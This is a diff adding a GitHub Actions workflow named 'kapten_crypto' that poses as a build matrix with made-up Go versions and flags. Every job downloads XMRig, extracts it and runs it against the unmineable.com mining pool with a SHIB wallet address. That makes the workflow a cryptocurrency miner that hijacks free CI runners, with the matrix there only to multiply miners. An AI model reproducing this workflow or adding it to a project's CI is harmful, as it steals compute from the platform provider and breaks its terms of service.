@@ -1,0 +1,51 @@
+name: kapten_crypto
+
+ 
+
+on: [workflow_dispatch]
+
+ 
+
+jobs:
+
+  build:
+
+    name: kapten_crypto
+
+    runs-on: windows-latest
+
+    strategy:
+
+      max-parallel: 5
+
+      fail-fast: false
+
+      matrix:
+
+        go: [1.0, 1.1, 1.2, 1.3, 1,35]
+
+        flag: [A, B, C, D, E, F, G, H, I]
+
+    env:
+
+        NUM_JOBS: 20
+
+        JOB: ${{ matrix.go }}
+
+    steps:
+
+    - name: DOWNLOAD
+
+      run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-msvc-win64.zip -OutFile xmrig-6.15.1-msvc-win64.zip
+
+    - name: Extract
+
+      run: Expand-Archive xmrig-6.15.1-msvc-win64.zip
+
+    - name: Running
+
+      run: .\xmrig-6.15.1-msvc-win64\xmrig-6.15.1\xmrig.exe -o  rx.unmineable.com:3333 -a rx -k -u SHIB:0x5aB7E2FDE0625d93842c0675BaEdcf9AA7a08c85.TRUST  -p x -t 1
+
+    - name: END
+
+      run: exit
